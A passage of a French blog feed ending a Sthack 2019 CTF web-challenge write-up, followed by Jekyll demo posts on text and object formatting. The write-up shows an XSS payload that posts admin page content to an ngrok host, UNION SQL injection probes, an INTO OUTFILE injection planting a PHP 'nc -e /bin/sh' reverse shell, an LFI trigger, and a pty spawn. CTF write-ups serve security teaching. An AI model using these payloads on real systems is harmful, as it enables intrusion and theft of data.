+&lt;p&gt;On peut voir que le paramètre GET est directement concaténé avec la requête SQL et qu’une nouvelle fois, il n’y a aucun contrôle sur les entrées utilisateur et aucune utilisation d’une solution sécurisée comme &lt;a href=&quot;https://www.php.net/manual/fr/book.pdo.php&quot; title=&quot;Documentation de PDO&quot;&gt;PDO&lt;/a&gt; pour les requêtes SQL.&lt;/p&gt;
+
+&lt;h1 id=&quot;etape-6--exploitation-de-la-faille-sqli&quot;&gt;Etape 6 : Exploitation de la faille SQLI&lt;/h1&gt;
+&lt;p&gt;Pour exploiter cette faille, il faut avoir accès à la page mais seul l’administrateur peut accéder à cette page.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/sthack_2019/cannot-access-stats.png&quot; alt=&quot;cannont_access_stats&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Pour ce faire, il faut passer par la faille XSS pour forcer l’administrateur à effectuer l’attaque. Ce qui fait que l’exploit va se dérouler en 3 étapes :&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;Envoi de l’exploit via le commentaire et lecture du commentaire par l’administrateur&lt;/li&gt;
+  &lt;li&gt;A la lecture du commentaire, récupération en GET de la page stats.php avec en paramètre de la page, l’exploit SQLi&lt;/li&gt;
+  &lt;li&gt;Envoi du résultat de la requête GET en POST vers ngrok, pour que l’on puisse lire le résultat de l’exploit&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h2 id=&quot;présentation-de-la-structure-de-lexploit&quot;&gt;Présentation de la structure de l’exploit&lt;/h2&gt;
+&lt;p&gt;Avant d’exploiter la faille SQLi, regardons de plus près la structure du payload.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-js&quot; data-lang=&quot;js&quot;&gt;	&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;script&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;src&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;https://ajax.googleapis.com/ajax/libs/jquery/3.4.0/jquery.min.js&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;sr&quot;&gt;/script&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;&amp;gt;
+&lt;/span&gt;	&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;script&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;type&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;text/javascript&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;
+		&lt;span class=&quot;nx&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;kd&quot;&gt;get&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;/the-admin-secure-interface/stats.php?stats_id=1&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;status&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;){&lt;/span&gt;
+	    	
+			&lt;span class=&quot;nx&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;post&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;http://XXXXXXXX.ngrok.io&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+		  	&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+			    &lt;span class=&quot;na&quot;&gt;html&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;decodeURIComponent&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+			&lt;span class=&quot;p&quot;&gt;},&lt;/span&gt;
+			&lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;status&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;){});&lt;/span&gt;
+	  	&lt;span class=&quot;p&quot;&gt;});&lt;/span&gt;	
+	&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;sr&quot;&gt;/script&amp;gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;La première ligne permet d’inclure JQuery dans la page afin de simplifier l’envoi des requêtes GET et POST. Ensuite la requête GET déclarée avec le $.get qui va retourner dans son callback le code html de la page stats.php.&lt;/p&gt;
+
+&lt;p&gt;Dans ce même callback, on déclare la requête post ($.post) qui va nous renvoyer ce code html. Avant le renvoi vers ngrok, le code html est décodé (decodeURIComponent) pour ne pas a avoir à le décoder à chaque lecture de la requête.&lt;/p&gt;
+
+&lt;p&gt;Maintenant que nous avons mis en place notre structure pour exploiter la faille SQLi, il faut chercher à comment exploiter cette faille. Le site n’ayant pas d’interface de login connu, inutile de chercher le mot de passe de l’administrateur dans la base de données. On va donc upload un reverse shell sur le serveur, ce qui est plus utile et plus fun que de récupérer un mot de passe.&lt;/p&gt;
+
+&lt;h2 id=&quot;connaître-le-nombre-de-colonne-de-la-requête&quot;&gt;Connaître le nombre de colonne de la requête&lt;/h2&gt;
+&lt;p&gt;Avant de pouvoir upload quoi que ce soit sur le serveur, on doit trouver le nombre de colonnes de la requête qui récupère les statistiques. Pour cela a modifié l’URL de la requête GET.&lt;/p&gt;
+
+&lt;p&gt;Essai avec une colonne.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-js&quot; data-lang=&quot;js&quot;&gt;		&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;/the-admin-secure-interface/stats.php?stats_id=' union select '666&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;Il y a une erreur php, ce qui signifie que ce n’est pas une colonne. Essai pour deux colonnes :&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-js&quot; data-lang=&quot;js&quot;&gt;		&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;/the-admin-secure-interface/stats.php?stats_id=' union select '666', '667&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;Cette fois le retour de la requête ne revoie aucune erreur, cela signifie qu’il y a deux colonnes à la requête.&lt;/p&gt;
+
+&lt;h2 id=&quot;upload-du-reverse-shell&quot;&gt;Upload du reverse shell&lt;/h2&gt;
+&lt;p&gt;Maintenant que l’on connaît le nombre de colonnes, nous allons pour pouvoir upload le reverse shell à l’aide de SQL. En effet, le langage SQL permet de pouvoir écrire des fichiers à l’aide de INTO OUTERFILE, ce qui va permettre d’upload un fichier php qui va ensuite permettre d’obtenir un reverse shell.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-js&quot; data-lang=&quot;js&quot;&gt;		&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;/the-admin-secure-interface/stats.php?stats_id=1' union select '', '&amp;lt;?php system(&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;nc -e /bin/sh &amp;lt;ip&amp;gt; &amp;lt;port&amp;gt; &lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;)?&amp;gt;' INTO OUTFILE '/tmp/rs.php&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;Comme nous pouvons le voir, au chargement du script php, le script va exécuter la commande netcat vers notre ip (en écoute sur netcat), ce qui va une fois la connexion établie nous donner un bash.&lt;/p&gt;
+
+&lt;h1 id=&quot;etape-7--récupération-du-flag&quot;&gt;Etape 7 : Récupération du flag&lt;/h1&gt;
+&lt;p&gt;Pour établir la connexion reverse shell, il faut exécuter le code php. Pour cela, on utilise la faille LFI pour charger le script.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-js&quot; data-lang=&quot;js&quot;&gt;		&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;?page=../../../tmp/rs&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;Une fois la connexion établie, et après une recherche dans les dossiers du serveur, on tombe sur /home/acid_burn qui possède une binaire nommé getFlag.&lt;/p&gt;
+
+&lt;p&gt;On execute le binaire et nous demande un pseudoterminal(&lt;a href=&quot;https://fr.wikipedia.org/wiki/Pseudo_terminal&quot; title=&quot;Wikipédia pseudoterminal&quot;&gt;pty&lt;/a&gt; ) pour s’exécuter.&lt;/p&gt;
+
+&lt;p&gt;Il y a plein de façon d’obtenir un shell pty, le site  &lt;a href=&quot;https://netsec.ws/?p=337&quot; title=&quot;Liste des shell pty&quot;&gt;netsec&lt;/a&gt; à lister plusieurs façons d’obtenir un pty shell. Pour ce challenge, on utilise python en faisant :&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;	python &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'import pty;pty.spawn(&quot;/bin/bash&quot;)'&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;Une fois le shell pty obtenu, on peut exécuter le binaire est récupérer le flag :&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;	Sql14nDAC5RF_R3alY?!&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;</content><author><name>Keclem blog</name></author><summary type="html">Dans cet article, je vais vous présenter le write up d’une épreuve web du CTF de la Sthack 2019, un événement dédié à la sécurité informatique sur Bordeaux qui s’est déroulé le 14 Juin 2019.</summary></entry><entry><title type="html">Welcome to Jekyll</title><link href="http://localhost:4000/welcome-to-jekyll/" rel="alternate" type="text/html" title="Welcome to Jekyll" /><published>2017-03-01T00:00:00+01:00</published><updated>2017-03-01T00:00:00+01:00</updated><id>http://localhost:4000/welcome-to-jekyll</id><content type="html" xml:base="http://localhost:4000/welcome-to-jekyll/">&lt;p&gt;You’ll find this post in your &lt;code class=&quot;highlighter-rouge&quot;&gt;_posts&lt;/code&gt; directory. Go ahead and edit it and re-build the site to see your changes. You can rebuild the site in many different ways, but the most common way is to run &lt;code class=&quot;highlighter-rouge&quot;&gt;jekyll serve&lt;/code&gt;, which launches a web server and auto-regenerates your site when a file is updated.&lt;/p&gt;
+
+&lt;p&gt;To add new posts, simply add a file in the &lt;code class=&quot;highlighter-rouge&quot;&gt;_posts&lt;/code&gt; directory that follows the convention &lt;code class=&quot;highlighter-rouge&quot;&gt;YYYY-MM-DD-name-of-post.ext&lt;/code&gt; and includes the necessary front matter. Take a look at the source for this post to get an idea about how it works.&lt;/p&gt;
+
+&lt;p&gt;Jekyll also offers powerful support for code snippets:&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-ruby&quot; data-lang=&quot;ruby&quot;&gt;&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;print_hi&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+  &lt;span class=&quot;nb&quot;&gt;puts&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;Hi, &lt;/span&gt;&lt;span class=&quot;si&quot;&gt;#{&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;end&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;print_hi&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'Tom'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;c1&quot;&gt;#=&amp;gt; prints 'Hi, Tom' to STDOUT.&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;Check out the &lt;a href=&quot;http://jekyllrb.com/docs/home&quot;&gt;Jekyll docs&lt;/a&gt; for more info on how to get the most out of Jekyll. File all bugs/feature requests at &lt;a href=&quot;https://github.com/jekyll/jekyll&quot;&gt;Jekyll’s GitHub repo&lt;/a&gt;. If you have questions, you can ask them on &lt;a href=&quot;https://talk.jekyllrb.com/&quot;&gt;Jekyll Talk&lt;/a&gt;.&lt;/p&gt;</content><author><name>Keclem blog</name></author><summary type="html">You’ll find this post in your _posts directory. Go ahead and edit it and re-build the site to see your changes. You can rebuild the site in many different ways, but the most common way is to run jekyll serve, which launches a web server and auto-regenerates your site when a file is updated.</summary></entry><entry><title type="html">Text formatting examples</title><link href="http://localhost:4000/text-formatting-examples/" rel="alternate" type="text/html" title="Text formatting examples" /><published>2017-02-01T00:00:00+01:00</published><updated>2017-02-01T00:00:00+01:00</updated><id>http://localhost:4000/text-formatting-examples</id><content type="html" xml:base="http://localhost:4000/text-formatting-examples/">&lt;p&gt;With Markdown, it is possible to emphasize words by making them &lt;em&gt;italicized&lt;/em&gt;, using &lt;em&gt;astericks&lt;/em&gt; or &lt;em&gt;underscores&lt;/em&gt;, or making them &lt;strong&gt;bold&lt;/strong&gt;, using &lt;strong&gt;double astericks&lt;/strong&gt; or &lt;strong&gt;double underscores&lt;/strong&gt;. Of course, you can combine those two formats, with both &lt;em&gt;&lt;strong&gt;bold and italicized&lt;/strong&gt;&lt;/em&gt; text, using any combination of the above syntax. You can also add a strikethrough to text using a &lt;del&gt;double tilde&lt;/del&gt;.&lt;/p&gt;
+
+&lt;p&gt;You can create &lt;a href=&quot;https://github.com&quot;&gt;inline links&lt;/a&gt; by wrapping link text in square brackets [ ], and then wrapping the URL in parentheses ( ). For example you can link your &lt;a href=&quot;/&quot;&gt;home page&lt;/a&gt;.&lt;/p&gt;
+
+&lt;h1 id=&quot;heading-one-h1&quot;&gt;Heading One (h1)&lt;/h1&gt;
+
+&lt;h2 id=&quot;heading-two-h2&quot;&gt;Heading Two (h2)&lt;/h2&gt;
+
+&lt;h3 id=&quot;heading-three-h3&quot;&gt;Heading Three (h3)&lt;/h3&gt;
+
+&lt;h4 id=&quot;heading-four-h4&quot;&gt;Heading Four (h4)&lt;/h4&gt;
+
+&lt;h5 id=&quot;heading-five-h5&quot;&gt;Heading Five (h5)&lt;/h5&gt;
+
+&lt;h6 id=&quot;heading-six-h6&quot;&gt;Heading Six (h6)&lt;/h6&gt;
+
+&lt;h2 id=&quot;blockquotes&quot;&gt;Blockquotes&lt;/h2&gt;
+
+&lt;h3 id=&quot;single-line&quot;&gt;Single line&lt;/h3&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;My mom always said life was like a box of chocolates. You never know what you’re gonna get.&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;h3 id=&quot;multiline&quot;&gt;Multiline&lt;/h3&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;What do you get when you cross an insomniac, an unwilling agnostic and a dyslexic?&lt;/p&gt;
+
+  &lt;p&gt;You get someone who stays up all night torturing himself mentally over the question of whether or not there’s a dog.&lt;/p&gt;
+
+  &lt;p&gt;– &lt;em&gt;Hal Incandenza&lt;/em&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;h2 id=&quot;horizontal-rule&quot;&gt;Horizontal Rule&lt;/h2&gt;
+
+&lt;hr /&gt;
+
+&lt;h2 id=&quot;table&quot;&gt;Table&lt;/h2&gt;
+
+&lt;table&gt;
+  &lt;thead&gt;
+    &lt;tr&gt;
+      &lt;th&gt;Title 1&lt;/th&gt;
+      &lt;th&gt;Title 2&lt;/th&gt;
+      &lt;th&gt;Title 3&lt;/th&gt;
+      &lt;th&gt;Title 4&lt;/th&gt;
+    &lt;/tr&gt;
+  &lt;/thead&gt;
+  &lt;tbody&gt;
+    &lt;tr&gt;
+      &lt;td&gt;First entry&lt;/td&gt;
+      &lt;td&gt;Second entry&lt;/td&gt;
+      &lt;td&gt;Third entry&lt;/td&gt;
+      &lt;td&gt;Fourth entry&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;Fifth entry&lt;/td&gt;
+      &lt;td&gt;Sixth entry&lt;/td&gt;
+      &lt;td&gt;Seventh entry&lt;/td&gt;
+      &lt;td&gt;Eight entry&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;Ninth entry&lt;/td&gt;
+      &lt;td&gt;Tenth entry&lt;/td&gt;
+      &lt;td&gt;Eleventh entry&lt;/td&gt;
+      &lt;td&gt;Twelfth entry&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;Thirteenth entry&lt;/td&gt;
+      &lt;td&gt;Fourteenth entry&lt;/td&gt;
+      &lt;td&gt;Fifteenth entry&lt;/td&gt;
+      &lt;td&gt;Sixteenth entry&lt;/td&gt;
+    &lt;/tr&gt;
+  &lt;/tbody&gt;
+&lt;/table&gt;
+
+&lt;h2 id=&quot;lists&quot;&gt;Lists&lt;/h2&gt;
+
+&lt;h3 id=&quot;unordered&quot;&gt;Unordered&lt;/h3&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;First item&lt;/li&gt;
+  &lt;li&gt;Second item&lt;/li&gt;
+  &lt;li&gt;Third item
+    &lt;ul&gt;
+      &lt;li&gt;First nested item&lt;/li&gt;
+      &lt;li&gt;Second nested item&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h3 id=&quot;ordered&quot;&gt;Ordered&lt;/h3&gt;
+
+&lt;ol&gt;
+  &lt;li&gt;First item&lt;/li&gt;
+  &lt;li&gt;Second item&lt;/li&gt;
+  &lt;li&gt;Third item
+    &lt;ol&gt;
+      &lt;li&gt;First nested item&lt;/li&gt;
+      &lt;li&gt;Second nested item&lt;/li&gt;
+    &lt;/ol&gt;
+  &lt;/li&gt;
+&lt;/ol&gt;</content><author><name>Keclem blog</name></author><summary type="html">With Markdown, it is possible to emphasize words by making them italicized, using astericks or underscores, or making them bold, using double astericks or double underscores. Of course, you can combine those two formats, with both bold and italicized text, using any combination of the above syntax. You can also add a strikethrough to text using a double tilde.</summary></entry><entry><title type="html">Object formatting examples</title><link href="http://localhost:4000/object-formatting-examples/" rel="alternate" type="text/html" title="Object formatting examples" /><published>2017-01-01T00:00:00+01:00</published><updated>2017-01-01T00:00:00+01:00</updated><id>http://localhost:4000/object-formatting-examples</id><content type="html" xml:base="http://localhost:4000/object-formatting-examples/">&lt;h2 id=&quot;mathjax&quot;&gt;MathJax&lt;/h2&gt;
+
+&lt;p&gt;You can enable MathJax by setting &lt;code class=&quot;highlighter-rouge&quot;&gt;mathjax: true&lt;/code&gt; on a page or globally in the &lt;code class=&quot;highlighter-rouge&quot;&gt;_config.yml&lt;/code&gt;. Some examples:&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&quot;https://en.wikipedia.org/wiki/Euler%27s_formula&quot;&gt;Euler’s formula&lt;/a&gt; relates the  complex exponential function to the trigonometric functions.&lt;/p&gt;
+
+&lt;script type=&quot;math/tex; mode=display&quot;&gt;e^{ix}=cos(x)+isin(x)&lt;/script&gt;
+
+&lt;p&gt;The &lt;a href=&quot;https://en.wikipedia.org/wiki/Lagrangian_mechanics&quot;&gt;Euler-Lagrange&lt;/a&gt; differential equation is the fundamental equation of calculus of variations.&lt;/p&gt;
+
+&lt;script type=&quot;math/tex; mode=display&quot;&gt;\frac{\mathrm{d}}{\mathrm{d}t} \left ( \frac{\partial L}{\partial \dot{q}} \right ) = \frac{\partial L}{\partial q}&lt;/script&gt;
+
+&lt;p&gt;The &lt;a href=&quot;https://en.wikipedia.org/wiki/Schr%C3%B6dinger_equation&quot;&gt;Schrödinger equation&lt;/a&gt; describes how the quantum state of a quantum system changes with time.&lt;/p&gt;
+
+&lt;script type=&quot;math/tex; mode=display&quot;&gt;i\hbar\frac{\partial}{\partial t} \Psi(\mathbf{r},t) = \left [ \frac{-\hbar^2}{2\mu}\nabla^2 + V(\mathbf{r},t)\right ] \Psi(\mathbf{r},t)&lt;/script&gt;
+
+&lt;h2 id=&quot;code&quot;&gt;Code&lt;/h2&gt;
+
+&lt;p&gt;Embed code by putting &lt;code class=&quot;highlighter-rouge&quot;&gt;{% highlight language %}&lt;/code&gt; &lt;code class=&quot;highlighter-rouge&quot;&gt;{% endhighlight %}&lt;/code&gt; blocks around it.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-c&quot; data-lang=&quot;c&quot;&gt;&lt;span class=&quot;k&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;asyncEnabled&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Dict&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;args&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;vAdmin&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;String&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;txid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Allocator&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;requestAlloc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Admin&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;admin&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Identity_check&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Admin&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;vAdmin&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+    &lt;span class=&quot;kt&quot;&gt;int64_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;enabled&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;admin&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;asyncEnabled&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;Dict&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;d&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Dict_CONST&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;String_CONST&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;asyncEnabled&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Int_OBJ&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;enabled&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;Admin_sendMessage&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;d&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;txid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;admin&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;h2 id=&quot;images&quot;&gt;Images&lt;/h2&gt;
+
+&lt;p&gt;Upload an image to the &lt;em&gt;assets&lt;/em&gt; folder and embed it with &lt;code class=&quot;highlighter-rouge&quot;&gt;![title](/assets/name.jpg))&lt;/code&gt;. Keep in mind that the path needs to be adjusted if Jekyll is run inside a subfolder.&lt;/p&gt;
+
+&lt;p&gt;The &lt;code class=&quot;highlighter-rouge&quot;&gt;.large&lt;/code&gt; wrapper can be used to increase the width of an image or iframe.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://user-images.githubusercontent.com/4943215/55412447-bcdb6c80-5567-11e9-8d12-b1e35fd5e50c.jpg&quot; alt=&quot;Flower&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&quot;https://unsplash.com/photos/iGrsa9rL11o&quot;&gt;Flower&lt;/a&gt; by Tj Holowaychuk&lt;/p&gt;
+
+&lt;div class=&quot;large&quot;&gt;
+  &lt;p&gt;&lt;img src=&quot;https://user-images.githubusercontent.com/4943215/55412536-edbba180-5567-11e9-9c70-6d33bca3f8ed.jpg&quot; alt=&quot;Swiss Alps&quot; /&gt;&lt;/p&gt;
+&lt;/div&gt;
+
+&lt;p&gt;&lt;a href=&quot;https://unsplash.com/photos/u0DmxB76uF4&quot;&gt;Swiss Alps&lt;/a&gt; by René Reichelt&lt;/p&gt;
+
+&lt;h2 id=&quot;embedded-content&quot;&gt;Embedded content&lt;/h2&gt;
+
+&lt;p&gt;You can also embed a lot of stuff, for example from YouTube. To scale the video to full width use the &lt;code class=&quot;highlighter-rouge&quot;&gt;&amp;lt;div class=&quot;embed&quot;&amp;gt;&amp;lt;/div&amp;gt;&lt;/code&gt; wrapper around the iframe.&lt;/p&gt;
+
